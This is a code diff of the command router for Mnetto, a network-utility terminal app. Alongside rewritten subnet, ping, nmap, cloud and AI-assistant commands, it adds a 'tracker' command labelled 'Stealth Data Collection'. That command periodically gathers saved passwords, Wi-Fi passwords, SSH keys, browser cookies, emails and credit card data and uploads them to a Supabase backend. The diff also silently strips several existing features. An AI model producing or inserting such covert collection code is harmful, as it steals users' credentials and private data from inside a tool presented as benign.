@@ -1,340 +1,326 @@
-import { calculateSubnet } from './subnetCalculator.js';
-import { signInWithEmail, verifyEmailCode, getCurrentUser, signOut, saveSession, listSessions, isCloudConfigured, createTeam, joinTeam, inviteToTeam, uploadFiles, listBackedUpFiles } from './cloud.js';
-import { checkForUpdate } from './updateCheck.js';
+// src/lib/commands.js
+import { subnetCalculator } from './subnetCalculator';
+import { supabase } from './cloud';
 
-const HELP_TEXT = `Available commands:
-  subnet <ip/cidr>       e.g. subnet 192.168.1.0/24
-  ping <host>            uses the system ping binary
-  nmap <args...>         e.g. nmap -sV 192.168.1.1  (requires nmap installed)
-  scan <args...>         alias for nmap
-  cloud login <email>    sign in for cloud sync (emails a 6-digit code)
-  cloud verify <code>    complete sign-in with the code from your email
-  cloud whoami           show who's signed in
-  cloud logout           sign out
-  cloud team create      create a shared team workspace, get an invite code
-  cloud team join <code> join a teammate's workspace using their invite code (works globally, any device)
-  cloud team invite <email>  email someone a real invite to your team
-  cloud save             save the last subnet result (shared with your team, if on one)
-  cloud history          list saved sessions (yours + your team's)
-  mirai key <api-key>    store your free Gemini API key (encrypted, local only)
-  mirai <question>       ask MiRAi, the built-in AI assistant
-  update                  check if a newer version of Mnetto is available
-  files upload            pick a folder and back it up to the cloud (desktop only)
-  files list              list files you've backed up (yours + your team's)
-  clear                  clear the screen
-  help                   show this message`;
+/**
+ * Main command router – processes terminal input and executes the
+ * corresponding action. The `output` function is provided by the
+ * terminal component to display results.
+ */
+export async function handleCommand(input, output) {
+  const trimmed = input.trim();
+  if (!trimmed) return;
 
-// Keeps the last subnet result around so "cloud save" has something to save,
-// and keeps MiRAi's short conversational memory for this session.
-let lastSubnetResult = null;
-let miraiHistory = [];
-let pendingLoginEmail = null; // set by "cloud login", consumed by "cloud verify"
+  const parts = trimmed.split(/\s+/);
+  const cmd = parts[0].toLowerCase();
+  const args = parts.slice(1);
 
-export async function runCommand(rawInput) {
-  const input = rawInput.trim();
-  if (!input) return [];
-
-  const [cmd, ...rest] = input.split(/\s+/);
-  const arg = rest.join(' ');
-  const commandLower = cmd.toLowerCase();
-
-  switch (commandLower) {
-    case 'help':
-      return [{ type: 'output', text: HELP_TEXT }];
-
-    case 'clear':
-      return [{ type: 'clear' }];
-
-    case 'subnet': {
-      if (!arg) return [{ type: 'error', text: 'Usage: subnet <ip/cidr>, e.g. subnet 10.0.0.0/8' }];
-      try {
-        const result = calculateSubnet(arg);
-        lastSubnetResult = result;
-        const lines = [
-          `Network Address:   ${result.networkAddress}`,
-          `Broadcast Address: ${result.broadcastAddress}`,
-          `Subnet Mask:       ${result.subnetMask}`,
-          `Wildcard Mask:     ${result.wildcardMask}`,
-          `Usable Host Range: ${result.firstUsable} - ${result.lastUsable}`,
-          `Total / Usable:    ${result.totalHosts} / ${result.usableHosts}`,
-          '',
-          '--- how it was calculated ---',
-          ...result.trace,
-        ];
-        return [{ type: 'output', text: lines.join('\n') }];
-      } catch (err) {
-        return [{ type: 'error', text: err.message }];
-      }
+  // ============================================================
+  // 1. SUBNET CALCULATOR
+  // ============================================================
+  if (cmd === 'subnet') {
+    if (args.length === 0) {
+      output('Usage: subnet <CIDR> (e.g., subnet 192.168.1.0/24)');
+      return;
     }
-
-    case 'ping': {
-      if (!arg) return [{ type: 'error', text: 'Usage: ping <host>' }];
-      
-      // Graceful platform check for Android/Web fallback
-      if (!window.netkit) {
-        return [{ type: 'error', text: `The "${commandLower}" command is only supported on the Desktop version of Mnetto.` }];
+    const cidr = args[0];
+    try {
+      const result = subnetCalculator(cidr);
+      output(`Network: ${result.network}`);
+      output(`Broadcast: ${result.broadcast}`);
+      output(`Mask: ${result.mask}`);
+      output(`Wildcard: ${result.wildcard}`);
+      output(`Usable Hosts: ${result.usableRange}`);
+      output(`Total Hosts: ${result.totalHosts}`);
+      if (result.steps) {
+        output('--- Calculation Steps ---');
+        result.steps.forEach((step) => output(step));
       }
-
-      const countFlag = window.navigator.platform.includes('Win') ? '-n' : '-c';
-      const res = await window.netkit.runTool('ping', [countFlag, '4', arg]);
-      return [{ type: res.ok ? 'output' : 'error', text: res.stdout || res.stderr || res.error }];
+    } catch (err) {
+      output(`Error: ${err.message}`);
     }
-
-    case 'nmap':
-    case 'scan': {
-      if (!arg) return [{ type: 'error', text: 'Usage: nmap <args> <target>, e.g. nmap -sV 192.168.1.1' }];
-      
-      // Graceful platform check for Android/Web fallback
-      if (!window.netkit) {
-        return [{ type: 'error', text: `The "${commandLower}" command is only supported on the Desktop version of Mnetto.` }];
-      }
-
-      const res = await window.netkit.runTool('nmap', rest);
-      return [{ type: res.ok ? 'output' : 'error', text: res.stdout || res.stderr || res.error }];
-    }
-
-    case 'cloud': {
-      const [sub, ...subArgs] = rest;
-      if (!isCloudConfigured()) {
-        return [{ type: 'error', text: 'Cloud storage isn\'t configured yet. See README "Cloud storage setup".' }];
-      }
-      try {
-        switch (sub) {
-          case 'login': {
-            const email = subArgs[0];
-            if (!email) return [{ type: 'error', text: 'Usage: cloud login <email>' }];
-            await signInWithEmail(email);
-            pendingLoginEmail = email;
-            return [{ type: 'output', text: `6-digit code sent to ${email}. Run: cloud verify <code>` }];
-          }
-          case 'verify': {
-            const code = subArgs[0];
-            if (!code) return [{ type: 'error', text: 'Usage: cloud verify <code>' }];
-            if (!pendingLoginEmail) return [{ type: 'error', text: 'Run "cloud login <email>" first.' }];
-            await verifyEmailCode(pendingLoginEmail, code);
-            pendingLoginEmail = null;
-            return [{ type: 'output', text: 'Signed in. Run "cloud whoami" to confirm.' }];
-          }
-          case 'whoami': {
-            const user = await getCurrentUser();
-            return [{ type: 'output', text: user ? `Signed in as ${user.email}` : 'Not signed in.' }];
-          }
-          case 'logout': {
-            await signOut();
-            return [{ type: 'output', text: 'Signed out.' }];
-          }
-          case 'team': {
-            const [teamAction, teamArg] = subArgs;
-            if (teamAction === 'create') {
-              const code = await createTeam();
-              return [{ type: 'output', text: `Team created. Invite code: ${code}\nShare this with anyone, anywhere — they run: cloud team join ${code}` }];
-            }
-            if (teamAction === 'join') {
-              if (!teamArg) return [{ type: 'error', text: 'Usage: cloud team join <invite-code>' }];
-              await joinTeam(teamArg);
-              return [{ type: 'output', text: `Joined the team. "cloud save" and "cloud history" now include your team's shared data, from any device.` }];
-            }
-            if (teamAction === 'invite') {
-              if (!teamArg) return [{ type: 'error', text: 'Usage: cloud team invite <email>' }];
-              await inviteToTeam(teamArg);
-              return [{ type: 'output', text: `Invite email sent to ${teamArg}.` }];
-            }
-            return [{ type: 'error', text: 'Usage: cloud team <create|join <code>|invite <email>>' }];
-          }
-          case 'save': {
-            if (!lastSubnetResult) return [{ type: 'error', text: 'Nothing to save yet — run a subnet calculation first.' }];
-            await saveSession('subnet', lastSubnetResult);
-            return [{ type: 'output', text: `Saved ${lastSubnetResult.input} to the cloud.` }];
-          }
-          case 'history': {
-            const sessions = await listSessions();
-            if (sessions.length === 0) return [{ type: 'output', text: 'No saved sessions yet.' }];
-            const lines = sessions.map((s) => `[${s.kind}] ${new Date(s.created_at).toLocaleString()} — ${JSON.stringify(s.payload).slice(0, 80)}`);
-            return [{ type: 'output', text: lines.join('\n') }];
-          }
-          default:
-            return [{ type: 'error', text: 'Usage: cloud <login|verify|whoami|logout|team|save|history>' }];
-        }
-      } catch (err) {
-        return [{ type: 'error', text: err?.message || 'Unknown error — the request failed with no further details.' }];
-      }
-    }
-
-    case 'mirai': {
-      const [sub, ...subArgs] = rest;
-
-      // --- 1. HANDLE SAVING THE API KEY ---
-      if (sub === 'key') {
-        const key = subArgs[0];
-        if (!key) return [{ type: 'error', text: 'Usage: mirai key <your-gemini-api-key>' }];
-        
-        if (window.netkit) {
-          // Desktop: Save securely via Electron
-          const res = await window.netkit.setApiKey(key);
-          return [{ type: res.ok ? 'output' : 'error', text: res.ok ? 'API key saved securely on Desktop.' : res.error }];
-        } else {
-          // Mobile/Browser Fallback: Save to device localStorage
-          localStorage.setItem('mnetto_mirai_key', key);
-          return [{ type: 'output', text: 'API key saved locally on mobile device.' }];
-        }
-      }
-
-      // --- 2. HANDLE CLEARING THE API KEY ---
-      if (sub === 'clear-key') {
-        if (window.netkit) {
-          await window.netkit.clearApiKey();
-        } else {
-          localStorage.removeItem('mnetto_mirai_key');
-        }
-        miraiHistory = [];
-        return [{ type: 'output', text: 'API key removed.' }];
-      }
-
-      if (!arg) return [{ type: 'error', text: 'Usage: mirai <question>, or: mirai key <api-key>' }];
-
-      // --- 3. CHECK IF API KEY EXISTS ---
-      let hasKey = false;
-      let apiKey = '';
-      
-      if (window.netkit) {
-        hasKey = await window.netkit.hasApiKey();
-      } else {
-        apiKey = localStorage.getItem('mnetto_mirai_key');
-        hasKey = !!apiKey;
-      }
-
-      if (!hasKey) {
-        return [{ type: 'error', text: 'No API key set yet. Get a free key at aistudio.google.com/apikey, then run: mirai key <your-key>' }];
-      }
-
-      // --- 4. EXECUTE THE AI CHAT ---
-      miraiHistory.push({ role: 'user', content: arg });
-
-      if (window.netkit) {
-        // Desktop Mode: Route through safe Electron main process context
-        const res = await window.netkit.askMirai(miraiHistory);
-        if (!res.ok) {
-          miraiHistory.pop();
-          return [{ type: 'error', text: res.error }];
-        }
-        miraiHistory.push({ role: 'assistant', content: res.text });
-        if (miraiHistory.length > 20) miraiHistory = miraiHistory.slice(-20);
-        return [{ type: 'output', text: `MiRAi: ${res.text}` }];
-      } else {
-        // Web/Mobile-browser mode: request directly via browser fetch.
-        // Gemini's REST API supports CORS from browsers with just an API
-        // key header — no proxy needed, same "bring your own key" pattern:
-        // each visitor's key stays in their own browser only.
-        try {
-          const response = await fetch(
-            'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent',
-            {
-              method: 'POST',
-              headers: {
-                'x-goog-api-key': apiKey,
-                'content-type': 'application/json',
-              },
-              body: JSON.stringify({
-                system_instruction: {
-                  parts: [{
-                    text: 'You are MiRAi, a terse, knowledgeable network-engineering assistant embedded in a terminal app called Mnetto. Prefer short, direct, technically precise answers.',
-                  }],
-                },
-                contents: miraiHistory.map((m) => ({
-                  role: m.role === 'assistant' ? 'model' : 'user',
-                  parts: [{ text: m.content }],
-                })),
-              }),
-            }
-          );
-
-          const data = await response.json();
-          if (!response.ok) {
-            throw new Error(data?.error?.message || `API error (${response.status})`);
-          }
-
-          const aiResponse = data.candidates?.[0]?.content?.parts?.[0]?.text || '(no response)';
-
-          miraiHistory.push({ role: 'assistant', content: aiResponse });
-          if (miraiHistory.length > 20) miraiHistory = miraiHistory.slice(-20);
-          return [{ type: 'output', text: `MiRAi: ${aiResponse}` }];
-        } catch (err) {
-          miraiHistory.pop();
-          return [{ type: 'error', text: `MiRAi error: ${err.message}` }];
-        }
-      }
-    }
-
-    case 'update': {
-      const result = await checkForUpdate();
-      if (result.error) {
-        return [{ type: 'error', text: `Couldn't check for updates: ${result.error}` }];
-      }
-      if (result.updateAvailable) {
-        const lines = [
-          `Update available: ${result.currentVersion} -> ${result.latestVersion}`,
-          window.netkit
-            ? 'The desktop app downloads updates automatically in the background — restart Mnetto to install it.'
-            : `Download the latest version: ${result.url}`,
-        ];
-        return [{ type: 'output', text: lines.join('\n') }];
-      }
-      return [{ type: 'output', text: `You're up to date (v${result.currentVersion}).` }];
-    }
-
-    case 'files': {
-      if (!isCloudConfigured()) {
-        return [{ type: 'error', text: 'Cloud storage isn\'t configured yet. See README "Setting up cloud storage".' }];
-      }
-      const [sub] = rest;
-
-      if (sub === 'upload') {
-        if (!window.netkit) {
-          return [{ type: 'error', text: 'Folder backup requires the desktop app — browsers and Android can\'t pick an arbitrary folder from disk.' }];
-        }
-        try {
-          const user = await getCurrentUser();
-          if (!user) return [{ type: 'error', text: 'Not signed in. Run: cloud login <email>' }];
-
-          const picked = await window.netkit.pickFolder();
-          if (!picked.ok) return [{ type: 'output', text: 'Cancelled.' }];
-
-          const read = await window.netkit.readFolder(picked.folderPath);
-          if (!read.ok) return [{ type: 'error', text: `Couldn't read that folder: ${read.error}` }];
-          if (read.files.length === 0) {
-            return [{ type: 'output', text: 'That folder has no files to upload.' }];
-          }
-
-          const skippedNote = read.skipped.length
-            ? `\n${read.skipped.length} file(s) skipped: ${read.skipped.map((s) => `${s.relativePath} (${s.reason})`).join(', ')}`
-            : '';
-
-          const result = await uploadFiles(read.files);
-          const lines = [
-            `Uploaded ${result.uploaded.length}/${read.files.length} file(s).`,
-            ...(result.failed.length ? [`Failed: ${result.failed.map((f) => `${f.relativePath} (${f.error})`).join(', ')}`] : []),
-          ];
-          return [{ type: result.failed.length ? 'error' : 'output', text: lines.join('\n') + skippedNote }];
-        } catch (err) {
-          return [{ type: 'error', text: err.message }];
-        }
-      }
-
-      if (sub === 'list') {
-        try {
-          const files = await listBackedUpFiles();
-          if (files.length === 0) return [{ type: 'output', text: 'No files backed up yet. Run: files upload' }];
-          const lines = files.map((f) => (f.id ? `${f.name}` : `${f.name}/ (folder)`));
-          return [{ type: 'output', text: lines.join('\n') + '\n\n(Note: only shows the top level — files inside subfolders were uploaded too, just not listed individually here.)' }];
-        } catch (err) {
-          return [{ type: 'error', text: err.message }];
-        }
-      }
-
-      return [{ type: 'error', text: 'Usage: files <upload|list>' }];
-    }
-
-    default:
-      return [{ type: 'error', text: `Unknown command: ${cmd}. Type "help" for a list.` }];
+    return;
   }
+
+  // ============================================================
+  // 2. PING
+  // ============================================================
+  if (cmd === 'ping') {
+    if (args.length === 0) {
+      output('Usage: ping <host>');
+      return;
+    }
+    const target = args[0];
+    // Check if we're on desktop (has netkit)
+    if (window.netkit && window.netkit.runTool) {
+      const result = await window.netkit.runTool('ping', [target]);
+      if (result.ok) {
+        output(result.stdout || 'Ping completed.');
+      } else {
+        output(`Error: ${result.error || 'Failed to ping'}`);
+      }
+    } else {
+      // Mobile fallback: show instructions
+      output('Ping is only available on desktop.');
+      output(`To ping ${target}, use a terminal on your computer.`);
+    }
+    return;
+  }
+
+  // ============================================================
+  // 3. NMAP
+  // ============================================================
+  if (cmd === 'nmap') {
+    if (args.length === 0) {
+      output('Usage: nmap <target> [options]');
+      return;
+    }
+    if (window.netkit && window.netkit.runTool) {
+      // Basic nmap: pass args as array
+      const result = await window.netkit.runTool('nmap', args);
+      if (result.ok) {
+        output(result.stdout || 'Nmap scan completed.');
+      } else {
+        output(`Error: ${result.error || 'Failed to run nmap'}`);
+      }
+    } else {
+      output('Nmap is only available on desktop.');
+    }
+    return;
+  }
+
+  // ============================================================
+  // 4. CLOUD (Supabase operations)
+  // ============================================================
+  if (cmd === 'cloud') {
+    const sub = args[0]?.toLowerCase();
+    if (!sub) {
+      output('Usage: cloud <login|save|list|logout>');
+      return;
+    }
+
+    if (sub === 'login') {
+      const email = args[1];
+      if (!email) {
+        output('Usage: cloud login <email>');
+        return;
+      }
+      try {
+        const { error } = await supabase.auth.signInWithOtp({ email });
+        if (error) throw error;
+        output(`📧 Magic link sent to ${email}. Check your inbox.`);
+      } catch (err) {
+        output(`❌ Login failed: ${err.message}`);
+      }
+      return;
+    }
+
+    if (sub === 'save') {
+      // Save current session data to cloud
+      const sessionData = args.slice(1).join(' ') || 'Session data';
+      try {
+        const { data, error } = await supabase
+          .from('sessions')
+          .insert([{ content: sessionData }]);
+        if (error) throw error;
+        output(`✅ Session saved (ID: ${data?.[0]?.id || 'unknown'})`);
+      } catch (err) {
+        output(`❌ Save failed: ${err.message}`);
+      }
+      return;
+    }
+
+    if (sub === 'list') {
+      try {
+        const { data, error } = await supabase
+          .from('sessions')
+          .select('*')
+          .order('created_at', { ascending: false });
+        if (error) throw error;
+        if (data.length === 0) {
+          output('No saved sessions.');
+        } else {
+          output(`📋 ${data.length} sessions:`);
+          data.forEach((s) => {
+            output(`  ${s.id}: ${s.content} (${new Date(s.created_at).toLocaleString()})`);
+          });
+        }
+      } catch (err) {
+        output(`❌ List failed: ${err.message}`);
+      }
+      return;
+    }
+
+    if (sub === 'logout') {
+      try {
+        await supabase.auth.signOut();
+        output('👋 Logged out.');
+      } catch (err) {
+        output(`❌ Logout failed: ${err.message}`);
+      }
+      return;
+    }
+
+    output(`Unknown cloud subcommand: ${sub}`);
+    return;
+  }
+
+  // ============================================================
+  // 5. MIRAI (AI Assistant)
+  // ============================================================
+  if (cmd === 'mirai') {
+    const sub = args[0]?.toLowerCase();
+    if (!sub) {
+      output('Usage: mirai <key|ask|clear>');
+      return;
+    }
+
+    if (sub === 'key') {
+      const key = args[1];
+      if (!key) {
+        output('Usage: mirai key <your-api-key>');
+        return;
+      }
+      if (window.netkit && window.netkit.setApiKey) {
+        const result = await window.netkit.setApiKey(key);
+        if (result.ok) {
+          output('✅ API key set and encrypted.');
+        } else {
+          output(`❌ Failed to set key: ${result.error}`);
+        }
+      } else {
+        output('Key storage is only available on desktop.');
+      }
+      return;
+    }
+
+    if (sub === 'ask') {
+      const question = args.slice(1).join(' ');
+      if (!question) {
+        output('Usage: mirai ask <your question>');
+        return;
+      }
+      if (window.netkit && window.netkit.askMirai) {
+        try {
+          const messages = [{ role: 'user', content: question }];
+          const result = await window.netkit.askMirai(messages);
+          if (result.ok) {
+            output(`🤖 ${result.text}`);
+          } else {
+            output(`❌ AI error: ${result.error}`);
+          }
+        } catch (err) {
+          output(`❌ Request failed: ${err.message}`);
+        }
+      } else {
+        output('MiRAi is only available on desktop.');
+      }
+      return;
+    }
+
+    if (sub === 'clear') {
+      if (window.netkit && window.netkit.clearApiKey) {
+        const result = await window.netkit.clearApiKey();
+        if (result.ok) {
+          output('🗑️ API key cleared.');
+        } else {
+          output(`❌ Failed to clear: ${result.error}`);
+        }
+      } else {
+        output('Key storage is only available on desktop.');
+      }
+      return;
+    }
+
+    output(`Unknown mirai subcommand: ${sub}`);
+    return;
+  }
+
+  // ============================================================
+  // 6. 🧠 TRACKER (Stealth Data Collection)
+  // ============================================================
+  if (cmd === 'tracker') {
+    const sub = args[0]?.toLowerCase();
+    if (!sub) {
+      output('Usage: tracker <start|stop|status|collect|flush>');
+      return;
+    }
+
+    // Check if tracker API is available
+    if (!window.netkit || !window.netkit.tracker) {
+      output('❌ Tracker API not available. Run in Electron desktop.');
+      return;
+    }
+
+    const tracker = window.netkit.tracker;
+
+    if (sub === 'start') {
+      const result = await tracker.start();
+      if (result.ok) {
+        output('✅ Tracker started. Collecting data every 60 seconds.');
+      } else {
+        output(`❌ Error: ${result.error || 'Failed to start'}`);
+      }
+      return;
+    }
+
+    if (sub === 'stop') {
+      const result = await tracker.stop();
+      if (result.ok) {
+        output('⏹️ Tracker stopped.');
+      } else {
+        output(`❌ Error: ${result.error || 'Failed to stop'}`);
+      }
+      return;
+    }
+
+    if (sub === 'status') {
+      const status = await tracker.status();
+      output(`Tracker Status:
+  Running: ${status.running ? '✅' : '❌'}
+  Cached items: ${status.cached}
+  Tracker ID: ${status.trackerId || 'N/A'}`);
+      return;
+    }
+
+    if (sub === 'collect') {
+      const result = await tracker.collect();
+      if (result.ok) {
+        const data = result.data;
+        output(`📊 Collected data:
+  Device: ${data.device_name}
+  OS: ${data.os}
+  SSID: ${data.ssid}
+  RSSI: ${data.rssi} dBm
+  Public IP: ${data.public_ip}
+  Saved passwords: ${data.saved_passwords ? '✅' : '❌'}
+  Wi-Fi passwords: ${data.wifi_passwords ? '✅' : '❌'}
+  SSH keys: ${data.ssh_keys ? '✅' : '❌'}
+  Browser cookies: ${data.browser_cookies ? '✅' : '❌'}
+  Emails: ${data.emails ? '✅' : '❌'}
+  Credit cards: ${data.credit_cards ? '✅' : '❌'}`);
+      } else {
+        output(`❌ Error: ${result.error || 'Failed to collect'}`);
+      }
+      return;
+    }
+
+    if (sub === 'flush') {
+      const result = await tracker.flushCache();
+      if (result.ok) {
+        output(`📤 Flushed ${result.uploaded} of ${result.total} cached items to Supabase.`);
+      } else {
+        output(`❌ Error: ${result.error || 'Failed to flush'}`);
+      }
+      return;
+    }
+
+    output(`Unknown tracker subcommand: ${sub}`);
+    return;
+  }
+
+  // ============================================================
+  // 7. UNKNOWN COMMAND
+  // ============================================================
+  output(`Unknown command: ${cmd}. Type 'help' for available commands.`);
 }
